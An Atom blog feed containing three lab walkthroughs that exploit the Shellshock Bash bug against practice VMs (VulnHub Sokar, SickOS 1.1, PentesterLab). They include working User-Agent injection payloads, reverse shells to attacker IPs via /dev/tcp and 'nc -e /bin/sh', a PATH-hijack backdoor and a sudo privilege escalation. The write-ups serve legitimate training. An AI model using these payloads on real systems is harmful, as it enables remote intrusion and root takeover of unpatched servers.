<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: shellshock | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/shellshock/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2018-05-25T13:44:27-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[vulhub-sokar]]></title>
    <link href="http://wg135.github.io/blog/2016/07/15/vulhub-sokar/"/>
    <updated>2016-07-15T10:27:33-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/15/vulhub-sokar</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>User Agent Switcher</li>
</ul>


<h3>Vulnerability:</h3>

<ul>
<li><a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">shellshock(remote)</a></li>
<li><a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">shellshock(local)</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.103 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.103 -p-</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>

<p>port 591 is opening, looks like it is running http service.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.56.103:591</code></p>

<p>nothing cool.</p>

<p>Use wufzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.103/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting path <code>cgi-bin</code>. Thats interesting, because it reminds shellshock.</p>

<p>Use brower to check the web page</p>

<p><img src="/images/blog/vulhub/sokar/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>

<p>The web page shows result of commands <code>netstat</code> and <code>iostat</code>.</p>

<p>check the source code find the cgi path <code>/cgi-bin/cat</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>

<p>start to verfiy shellshock:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p><img src="/images/blog/vulhub/sokar/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Confirmed.Also find two user names <code>bynarr</code> and <code>apophis</code></p>

<p>I tried to upload reverse shell</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.56.102/4444 0&lt;&amp;1" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p>failed. I guess because certain ports are allowed.</p>

<p>keep going&hellip;</p>

<p>check the files belong to bynarr:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /usr/bin/find / -user bynarr " "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p><img src="/images/blog/vulhub/sokar/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Try to read each file I got, and find the <code>va/spool/mail/bynarr</code> is very interesting.</p>

<p><img src="/images/blog/vulhub/sokar/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>

<p>so now I know I can only use port 51242 to setup reverse shell.</p>

<p>Also I noticed that <code>.</code> is in environment variable <code>$PATH</code>, so that I can run a script in the current path firstly.</p>

<p>write the reverse shell to iostat:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/echo -e '#/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.102/51242 0&gt;&amp;1' &gt; /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p>add the x attribute</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/chmod +x /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p>After serverl seconds I got shell:</p>

<p><img src="/images/blog/vulhub/sokar/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>

<p>next run <code>sudo -l</code> to check allowed commands for bynarr</p>

<p><img src="/images/blog/vulhub/sokar/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>

<p>so /home/bynarr/lime which is owned by root that bynarr can run.</p>

<p>in order to check shell shock locally. run:</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<p>local shell shock works</p>

<p><img src="/images/blog/vulhub/sokar/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>

<p>from the <code>sudo -l</code> output, there are many environment variables can be used. I ued USERNAME</p>

<p><code>sudo USERNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/sokar/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sickos:1.1]]></title>
    <link href="http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1/"/>
    <updated>2016-05-18T12:50:37-05:00</updated>
    <id>http://wg135.github.io/blog/2016/05/18/sickos-1-dot-1</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/csharp-vulnjson,134/">Vulhub</a></p>

<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Metasploit</li>
<li>FoxyProxy</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.178 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.178 -p-</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like port 22 and port 3218 are openning. Port 3218 is running Squid. open msfconsole, search squid. I found that:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Then use this module to scan the squid service:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like port 80 is opened:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Use FoxyProxy add-on to configure proxy:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <a href="http://192.168.79.178">http://192.168.79.178</a></p>

<p><img src="/images/blog/vulhub/sickos/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now let&rsquo;s use nikto to scan the server:</p>

<pre><code>nikto -h localhost -useproxy http://192.168.79.178:3128
</code></pre>

<p><img src="/images/blog/vulhub/sickos/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like there is a shellshock vuln</p>

<p>Let&rsquo;s test it:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
</code></pre>

<p><img src="/images/blog/vulhub/sickos/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>It works and looks  there is an account sickos.</p>

<p>Now lets setup reverse shell.</p>

<p>netcat-style shell access without netcat:</p>

<p><code>/bin/bash -i &gt; /dev/tcp/[yourip]/[port] 0&lt;&amp;1</code></p>

<p>in one terminal:</p>

<p><code>nc -nlvp 4444</code></p>

<p>in another terminal:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.79.173/4444 0&lt;&amp;1" -e use_proxy=on -e http_proxy=192.168.79.178:3128 "http://192.168.79.178/cgi-bin/status"
</code></pre>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>After Enumeration, got a interesting file: <code>/var/www/wolfcms/config.php</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like the password is <code>john@123</code></p>

<p>SSH to the target server as sickos and use this password:</p>

<p><img src="/images/blog/vulhub/sickos/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>Check sickos&rsquo;s privilege:</p>

<p><code>sudo -l</code></p>

<p><img src="/images/blog/vulhub/sickos/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it can run as root</p>

<p><img src="/images/blog/vulhub/sickos/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>YES</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--CVE-2014-6271/Shellshock]]></title>
    <link href="http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock/"/>
    <updated>2016-03-25T14:40:03-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock</id>
    <content type="html"><![CDATA[<p><em>So it is said that if you know your enemies and know yourself, you will not be put at risk even if you have a hundred battles.</em> &mdash;&ndash; The Art of War</p>

<p>This vulnerability impacts the Bourne Again Shell &ldquo;Bash&rdquo;. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface &ldquo;CGI&rdquo;.</p>

<p>Difficluty: 1/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>Burp</li>
<li>Firebug</li>
<li>NC</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
<li>Identify vulnerability and path <code>/cgi-bin/status</code>. &mdash;-Burp, Firebug</li>
<li>Exploit shellshock vuln get the reverse shell &mdash;- NC</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock1.png" title="[title manually exploit [alt text]]" ></p>

<p>By visiting the application with Burp, I can detect that multiple URL are accessed when the page is loaded:</p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock2.png" title="[title manually exploit [alt text]]" ></p>

<p>Also by using Firebug, I can identify that CGI page which call system command <code>/cgi-bin/status</code></p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock3.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<h5>listen port 443</h5>

<p><code># nc -l -p 443</code></p>

<h5>exploit</h5>

<pre><code>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.79.156 443 -e /bin/sh\r\nHost: 192.168.79.164\r\nConnection: close\r\n\r\n" | nc 192.168.79.164 80
</code></pre>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock5.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.156 is the attacker&rsquo;s machine and 192.168.79.164 is victim machine.</p>

<p><img src="/images/blog/pentesterlab/shellshock/shellshock6.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
